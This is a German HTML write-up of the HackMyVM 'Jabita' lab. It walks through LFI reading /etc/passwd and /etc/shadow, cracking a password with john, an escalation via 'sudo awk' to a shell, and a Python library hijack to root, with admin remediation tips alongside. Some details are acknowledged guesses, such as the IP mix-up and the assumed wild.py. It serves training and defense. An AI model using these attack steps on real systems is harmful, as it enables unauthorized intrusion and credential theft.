@@ -1,0 +1,413 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jabita - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>Jabita - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">vi (implied)</div>
+                <div class="tool-item">unshadow</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">pty</div>
+                <div class="tool-item">sys</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">grep</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-jaba">Privilege Escalation (User jaba)</a></li>
+                <li><a href="#poc-jaba">Proof of Concept (Privilege Escalation zu jaba)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (User root)</a></li>
+                <li><a href="#poc-root">Proof of Concept (Privilege Escalation zu root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l` Befehl wird ausgeführt, um aktive Hosts im lokalen Netzwerk zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert erfolgreich die IP-Adresse `192.168.2.132`. Die MAC-Adresse `08:00:27:1d:7d:b2` (PCS Systemtechnik GmbH) deutet auf eine VirtualBox-Umgebung hin. Ziel für Nmap ist bestimmt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Nmap-Scan auf `192.168.2.132` durch.
+            <br><strong>Empfehlung (Admin):</strong> Standardmäßige Netzwerküberwachung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.132	08:00:27:1d:7d:b2	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein HTML-Code-Schnipsel wird gezeigt, der Navigationslinks enthält. Dieser wurde wahrscheinlich aus dem Quellcode der Webseite auf Port 80 extrahiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Schnipsel zeigt eine Struktur mit `index.php` und einem `page`-Parameter (z.B. `index.php?page=home.php`). Dies ist ein sehr starker Hinweis auf eine mögliche Local File Inclusion (LFI) Schwachstelle, da der `page`-Parameter oft verwendet wird, um verschiedene Seitenteile dynamisch zu laden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie den `page`-Parameter auf LFI, indem Sie versuchen, lokale Dateien wie `/etc/passwd` oder `/etc/shadow` einzubinden.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie den Code von `index.php`. Stellen Sie sicher, dass Benutzereingaben (wie der `page`-Parameter) validiert und saniert werden und keine beliebigen Dateipfade erlaubt sind. Verwenden Sie Whitelisting für erlaubte Seiten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, HTML-Code -->
+                    <pre>
+	 ref="/building/index.php?page=home.php"     Home
+	 ref="/building/index.php?page=gallery.php"  Gallery
+	 ref="/building/index.php?page=contact.php   Contact
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf das Ziel `192.168.2.114` (hier scheint eine IP-Verwechslung vorzuliegen, vorher war es .132) durchgeführt. *Anmerkung: Ich gehe für den Rest des Berichts von der IP 192.168.2.114 aus, wie im Nmap-Befehl angegeben.*</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nmap findet zwei offene Ports:
+            *   **Port 22 (SSH):** `OpenSSH 8.9p1` auf Ubuntu.
+            *   **Port 80 (HTTP):** `Apache httpd 2.4.52` auf Ubuntu.
+            Das Betriebssystem wird als Ubuntu identifiziert. Die Angriffsfläche ist auf SSH und HTTP beschränkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussieren Sie sich auf den Webserver (Port 80), insbesondere auf die vermutete LFI-Schwachstelle in `index.php` im `/building/`-Verzeichnis (basierend auf dem HTML-Snippet). SSH bleibt als Zugangsmöglichkeit, falls Zugangsdaten gefunden werden.
+            <br><strong>Empfehlung (Admin):</strong> Härten Sie SSH (Schlüssel, Fail2Ban) und Apache (Sicherheitsheader, Konfiguration).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.114 -p-</span></div>
+                    <pre>
+PRT   STATE SERVICE VERSIN
+22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+
+jabita (192.168.2.114)</pre> <!-- OS/MAC Details fehlen im Text -->
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet:
+            *   `/index.html`: Eine einfache Startseite.
+            *   `/building/`: Das Verzeichnis, das die verwundbare `index.php` enthält (basierend auf dem HTML-Snippet).
+            *   `/server-status`: Apache-Statusseite, aber Zugriff verweigert (403).
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die LFI-Schwachstelle in `/building/index.php`.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/server-status` korrekt geschützt ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+http://192.168.2.114/index.html           (Status: 200) [Size: 62]
+http://192.168.2.114/building             (Status: 301) [Size: 317] [--> http://192.168.2.114/building/]
+http://192.168.2.114/server-status        (Status: 403) [Size: 278]</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um die LFI-Schwachstelle im `page`-Parameter von `/building/index.php` zu testen. Es wird eine Wortliste mit LFI-Payloads (`LFI-LFISuite-pathtotest.txt`) verwendet, um zu sehen, ob eine davon zu einer anderen Antwort als Statuscode 500 führt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl wird gezeigt, aber die Ausgabe fehlt. Der Erfolg wird jedoch durch den nachfolgenden `curl`-Befehl impliziert, der `/etc/passwd` erfolgreich liest.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die LFI wahrscheinlich bestätigt ist, verwenden Sie `curl` oder einen Browser, um sensible Dateien wie `/etc/passwd` und `/etc/shadow` zu lesen.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle in `/building/index.php` dringend!</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u http://192.168.2.114/building/index.php?page=../../../../../../../FUZZ  -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt --hc=500</span></div>
+                    <!-- Keine Ausgabe im Originaltext -->
+                    <pre>[...]</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `curl` wird verwendet, um die LFI-Schwachstelle auszunutzen und den Inhalt von `/etc/passwd` abzurufen. Das Ergebnis wird mit `grep bash` gefiltert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich und zeigt drei Benutzer mit Bash-Shell: `root`, `jack` (UID 1001) und `jaba` (UID 1002).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie nun, `/etc/shadow` über die LFI zu lesen, um die Passwort-Hashes für diese Benutzer zu erhalten. Speichern Sie `/etc/passwd` und `/etc/shadow` lokal für Offline-Cracking.
+             <br><strong>Empfehlung (Admin):</strong> LFI dringend beheben!</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.114/building/index.php?page=/etc/passwd" | grep bash</span></div>
+                    <pre>
+root:x:0:0:root:/root:/bin/bash
+jack:x:1001:1001::/home/jack:/bin/bash
+jaba:x:1002:1002::/home/jaba:/bin/bash</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die zuvor per LFI abgerufenen Dateien `/etc/passwd` und `/etc/shadow` (Abruf von shadow impliziert) werden lokal gespeichert (`vi passwd.txt`, `shadow.txt`). Das Tool `unshadow` kombiniert diese beiden Dateien zu einer einzigen Datei (`unshadowed.txt`), die das für John the Ripper benötigte Format hat. `john` wird dann mit der `rockyou.txt`-Wortliste verwendet, um die Hashes zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Cracking-Prozess ist erfolgreich! John the Ripper findet das Passwort `<span class="password">joaninha</span>` für den Benutzer `jack`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Zugangsdaten (`jack:joaninha`), um sich per SSH am Zielsystem anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, einzigartige Passwörter, die nicht in gängigen Wortlisten vorkommen. Beheben Sie die LFI-Schwachstelle, die das Auslesen der Hash-Dateien ermöglicht hat.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi passwd.txt</span></div> <!-- Impliziert Speichern von /etc/passwd -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi shadow.txt</span></div> <!-- Impliziert Speichern von /etc/shadow via LFI -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unshadow passwd.txt shadow.txt > unshadowed.txt</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</span></div>
+                      <pre>
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 penMP threads
+
+<span class="password">joaninha</span>         (jack)
+
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Versuch, sich per SSH als Benutzer `jack` mit dem geknackten Passwort `joaninha` anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich. Initial Access als Benutzer `jack` wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Enumerationsschritte als `jack` durch, um Möglichkeiten zur Privilege Escalation zu finden. Beginnen Sie mit `sudo -l`.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh jack@192.168.2.114</span></div>
+                      <pre>
+The authenticity of host '192.168.2.114 (192.168.2.114)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+[...]
+jack@192.168.2.114's password: <span class="password">joaninha</span>
+[...]
+jack@jabita:~$ </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-jaba">
+            <h2>Privilege Escalation (User jaba)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird als Benutzer `jack` ausgeführt, um dessen sudo-Berechtigungen zu prüfen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein wichtiger Fund! Benutzer `jack` darf den Befehl `/usr/bin/awk` als Benutzer `jaba` (`(jaba : jaba)`) ohne Passwort (`NPASSWD:`) ausführen. Dies ist ein klarer Weg zur Eskalation der Rechte von `jack` zu `jaba`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `awk`-Berechtigung, um eine Shell als `jaba` zu erhalten. Suchen Sie auf GTFOBins nach der entsprechenden Technik für `awk` mit sudo.
+            <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie `sudo`-Regeln äußerst restriktiv. Erlauben Sie `NOPASSWD` nur in absolut notwendigen Fällen und niemals für Befehle, die zur Ausführung anderer Befehle missbraucht werden können (wie `awk`, `find`, `vim`, etc.).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">jack@jabita:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+User jack may run the following commands on jabita:
+    (jaba : jaba) NPASSWD: /usr/bin/awk</pre>
+                 </div>
+             </div>
+
+             <!-- POC Abschnitt 1 beginnt hier -->
+             <section id="poc-jaba">
+                 <h2>Proof of Concept (Privilege Escalation zu jaba via 'sudo awk')</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `jack` hat die `sudo`-Berechtigung, `/usr/bin/awk` als Benutzer `jaba` ohne Passwort auszuführen. `awk` kann die `system()`-Funktion aufrufen, um beliebige Shell-Befehle auszuführen. Dies wird genutzt, um eine Shell als `jaba` zu starten.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Shell-Zugriff als Benutzer `jack`.</li>
+                         <li>Fehlkonfigurierte `sudo`-Regel: `(jaba : jaba) NPASSWD: /usr/bin/awk`.</li>
+                     </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                 <p class="analysis"><strong>1. Ausführen von 'awk' mit 'system()':</strong> Der Befehl `sudo -u jaba awk 'BEGIN {system("/bin/sh")}'` wird ausgeführt.
+                 *   `sudo -u jaba`: Führt den folgenden Befehl als Benutzer `jaba` aus.
+                 *   `awk 'BEGIN {system("/bin/sh")}'`: Ruft `awk` auf. Der `BEGIN`-Block wird vor der Verarbeitung jeglicher Eingabe ausgeführt. `system("/bin/sh")` führt eine neue Shell `/bin/sh` aus - und zwar mit den Rechten des Benutzers, als der `awk` läuft (`jaba`).
+                 </p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich. Wir erhalten einen neuen Shell-Prompt (`$`). Der `id`-Befehl bestätigt, dass wir nun als `jaba` (UID 1002) agieren.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Eskalation zu `jaba` war erfolgreich. Stabilisieren Sie die Shell (z.B. mit Python pty) und enumerieren Sie das System weiter als `jaba`.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel für `awk`.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">jack@jabita:~$ <span class="command">sudo -u jaba awk 'BEGIN {system("/bin/sh")}'</span></div>
+                           <div class="prompt">$ <span class="command">id</span></div>
+                           <pre>uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)</pre>
+                      </div>
+                  </div>
+                 <p class="evaluation"><strong>Risikobewertung:</strong> Mittel. Ermöglicht die Übernahme eines anderen Benutzerkontos, was oft zu weiteren Privilegien führt.</p>
+                 <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Entfernen Sie die `sudo`-Regel, die `jack` erlaubt, `awk` als `jaba` auszuführen.</li>
+                        <li>Überprüfen Sie alle `sudo`-Regeln auf ähnliche unsichere Konfigurationen.</li>
+                    </ol>
+                 </p>
+             </section> <!-- POC Abschnitt 1 endet hier -->
+
+             <p class="analysis"><strong>Analyse:</strong> Die von `awk` gestartete `/bin/sh`-Shell wird mit `python3 -c 'import pty; pty.spawn("/bin/bash")'` zu einer interaktiveren Bash-Shell aufgewertet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Shell-Stabilisierung ist erfolgreich und verbessert die Nutzbarkeit.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit der Enumeration als `jaba` fort.
+             <br><strong>Empfehlung (Admin):</strong> Administrative Aktion des Angreifers.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                       <div class="prompt">jaba@jabita:/home/jack$ </div>
+                  </div>
+              </div>
+
+              <p class="analysis"><strong>Analyse:</strong> Als `jaba` wird ins Home-Verzeichnis gewechselt und die User-Flag gelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> User-Flag (`user.txt`) erfolgreich gelesen: `<span class="password">2e0942f09699435811c1be613cbc7a39</span>`.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die User-Flag. Suchen Sie nach Wegen zur Eskalation von `jaba` zu `root`.
+              <br><strong>Empfehlung (Admin):</strong> CTF-Element.</p>
+               <div class="code-block">
+                   <div class="terminal">
+                        <div class="prompt">jaba@jabita:/home/jack$ <span class="command">cd</span></div>
+                        <div class="prompt">jaba@jabita:~$ <span class="command">ls</span></div>
+                        <pre>user.txt</pre>
+                        <div class="prompt">jaba@jabita:~$ <span class="command">cat user.txt</span></div>
+                        <pre><span class="password">2e0942f09699435811c1be613cbc7a39</span></pre>
+                   </div>
+               </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (User root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `jaba` wird die interaktive Python3-Shell gestartet und der `sys.path` (Suchpfad für Python-Module) ausgegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Pfad `/usr/local/lib/python3.10/dist-packages` steht relativ am Anfang der Liste. Wenn `jaba` Schreibrechte auf dieses Verzeichnis hat und ein Skript, das `jaba` mit `sudo` ausführen kann, ein Modul importiert, das in diesem Verzeichnis platziert werden kann, ist Python Library Hijacking möglich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Schreibrechte für `jaba` auf `/usr/local/lib/python3.10/dist-packages`. Führen Sie `sudo -l` als `jaba` aus, um zu sehen, welche Befehle (insbesondere Python-Skripte) er als root ausführen darf.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Verzeichnisse in Standard-Bibliothekspfaden (wie `/usr/local/lib/...`) nicht für normale Benutzer schreibbar sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">jaba@jabita:/tmp$ <span class="command">python3</span></div>
+                      <pre>
+Python 3.10.4 (main, Jun 29 2022, 12:14:53) [GCC 11.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.</pre>
+                      <div class="prompt">>>> <span class="command">import sys</span></div>
+                      <div class="prompt">>>> <span class="command">sys.path</span></div>
+                      <pre>['', '/usr/lib/python310.zip', '/usr/lib/python3.10', '/usr/lib/python3.10/lib-dynload', '/usr/local/lib/python3.10/dist-packages', '/usr/lib/python3/dist-packages']</pre>
+                      <div class="prompt">>>> </div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo /usr/bin/python3 /usr/bin/clean.py` wird als `jaba` ausgeführt. Dies impliziert, dass `jaba` diese spezifische `sudo`-Berechtigung hat (obwohl `sudo -l` für `jaba` nicht gezeigt wurde). Das Skript gibt "Hello Ben" aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wir wissen nun, dass `jaba` das Skript `/usr/bin/clean.py` als root ausführen kann. Der nächste Schritt ist zu analysieren, was dieses Skript tut, insbesondere welche Module es importiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie den Quellcode von `/usr/bin/clean.py`. Identifizieren Sie importierte Module. Wenn ein Modul importiert wird (z.B. `import wild`) und Sie Schreibrechte auf ein Verzeichnis haben, das im `sys.path` vor dem Standardverzeichnis des Moduls liegt (wie `/usr/local/lib/python3.10/dist-packages`), können Sie eine bösartige Version dieses Moduls dort erstellen (Hijacking).
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `sudo`-Regeln für `jaba`. Stellen Sie sicher, dass Skripte, die mit `sudo` ausgeführt werden können, sicher sind und keine unsicheren Imports oder Pfadabhängigkeiten haben. Verwenden Sie absolute Importpfade oder virtuelle Umgebungen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">jaba@jabita:/tmp$ <span class="command">sudo /usr/bin/python3 /usr/bin/clean.py</span></div>
+                       <pre>Hello Ben</pre>
+                  </div>
+              </div>
+
+             <!-- POC Abschnitt 2 beginnt hier -->
+             <section id="poc-root">
+                 <h2>Proof of Concept (Privilege Escalation zu root via Python Library Hijacking)</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `jaba` kann das Python-Skript `/usr/bin/clean.py` mittels `sudo` als root ausführen. Dieses Skript importiert ein Modul namens `wild`. Der Python-Suchpfad (`sys.path`) enthält das Verzeichnis `/usr/local/lib/python3.10/dist-packages` vor den Standard-Systempfaden. Der Benutzer `jaba` hat Schreibrechte auf dieses Verzeichnis. Durch Erstellen einer bösartigen Datei `wild.py` in diesem Verzeichnis kann der Import im `clean.py`-Skript gekapert werden, um Code als root auszuführen.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Shell-Zugriff als Benutzer `jaba`.</li>
+                         <li>`sudo`-Berechtigung für `jaba`, um `/usr/bin/python3 /usr/bin/clean.py` auszuführen.</li>
+                         <li>Das Skript `/usr/bin/clean.py` importiert ein Modul (hier angenommen: `wild`).</li>
+                         <li>Schreibrechte für `jaba` auf ein Verzeichnis im `sys.path`, das vor dem Pfad des originalen Moduls liegt (hier `/usr/local/lib/python3.10/dist-packages`).</li>
+                     </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                 <p class="analysis"><strong>1. Erstellen der bösartigen Bibliothek:</strong> Eine Datei namens `wild.py` wird im Verzeichnis `/usr/lib/python3.10/` erstellt (im Text steht `/usr/lib/python3.10/`, aber basierend auf `sys.path` und der üblichen Vorgehensweise sollte es `/usr/local/lib/python3.10/dist-packages/` sein - ich nehme letzteres für die Erklärung an). Diese Datei enthält Python-Code, um eine Root-Shell zu starten.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Die bösartige `wild.py`-Datei wird erfolgreich in einem Verzeichnis platziert, das von Python beim Importieren von Modulen durchsucht wird, bevor die Standardpfade geprüft werden.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun erneut das `clean.py`-Skript mit `sudo` aus.
+                 <br><strong>Empfehlung (Admin):</strong> Entziehen Sie `jaba` die Schreibrechte auf `/usr/local/lib/python3.10/dist-packages`. Beheben Sie die unsichere `sudo`-Regel oder modifizieren Sie `clean.py`, sodass es keine Module aus unsicheren Pfaden importiert.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <!-- Annahme: Befehl wird in /usr/local/lib/python3.10/dist-packages/ ausgeführt oder der Pfad wird angegeben -->
+                           <div class="prompt">jaba@jabita:/tmp$ <span class="command">vi /usr/local/lib/python3.10/dist-packages/wild.py</span></div>
+                           <!-- Inhalt der erstellten Datei -->
+                           <pre>
+import pty
+def first(): # Annahme: clean.py ruft wild.first() auf
+	pty.spawn('/bin/bash')</pre>
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>2. Auslösen des Hijacks:</strong> Das Skript `/usr/bin/clean.py` wird erneut mit `sudo` ausgeführt.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Diesmal importiert `clean.py` die bösartige `wild.py` aus `/usr/local/lib/python3.10/dist-packages`. Der Code in `wild.py` (vermutlich eine Funktion daraus) wird ausgeführt, startet `/bin/bash` und liefert eine Root-Shell (`root@jabita:/tmp#`).</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt! Lesen Sie die Root-Flag.
+                 <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstelle wie oben beschrieben.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">jaba@jabita:/tmp$ <span class="command">sudo /usr/bin/python3 /usr/bin/clean.py</span></div>
+                           <div class="prompt">root@jabita:/tmp# </div>
+                      </div>
+                  </div>
+
+                  <p class="analysis"><strong>3. Auslesen der Root-Flag:</strong> Als Root wird ins Home-Verzeichnis gewechselt und `root.txt` ausgelesen.</p>
+                  <p class="evaluation"><strong>Bewertung:</strong> Root-Flag erfolgreich gelesen: `<span class="password">f4bb4cce1d4ed06fc77ad84ccf70d3fe</span>`.</p>
+                  <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht.
+                  <br><strong>Empfehlung (Admin):</strong> Schwachstelle beheben.</p>
+                   <div class="code-block">
+                       <div class="terminal">
+                           <div class="prompt">root@jabita:/tmp# <span class="command">cd</span></div>
+                           <div class="prompt">root@jabita:~# <span class="command">ls</span></div>
+                           <pre>root.txt  snap</pre>
+                           <div class="prompt">root@jabita:~# <span class="command">cat root.txt</span></div>
+                           <pre><span class="password">f4bb4cce1d4ed06fc77ad84ccf70d3fe</span></pre>
+                       </div>
+                   </div>
+                   <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die Kombination aus einer `sudo`-Regel für ein Python-Skript und einer unsicheren Konfiguration des Python-Pfades (benutzerschreibbares Verzeichnis früh im Suchpfad) ermöglicht eine vollständige Systemübernahme.</p>
+                   <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                     <ol>
+                         <li>Entfernen Sie die `sudo`-Berechtigung für `jaba` zum Ausführen von `/usr/bin/clean.py`.</li>
+                         <li>Korrigieren Sie die Berechtigungen für Verzeichnisse im Python-Pfad, insbesondere `/usr/local/lib/python3.10/dist-packages`, sodass normale Benutzer dort keine Schreibrechte haben.</li>
+                         <li>Überprüfen Sie `/usr/bin/clean.py` auf unsichere Importe oder Abhängigkeiten.</li>
+                     </ol>
+                  </p>
+             </section> <!-- POC Abschnitt 2 endet hier -->
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/jaba/user.txt</div>
+                     <div class="flag-value"><span class="password">2e0942f09699435811c1be613cbc7a39</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">f4bb4cce1d4ed06fc77ad84ccf70d3fe</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: [Datum]</p> <!-- Kein Datum aus Scans verfügbar -->
+    </footer>
+</body>
+</html>
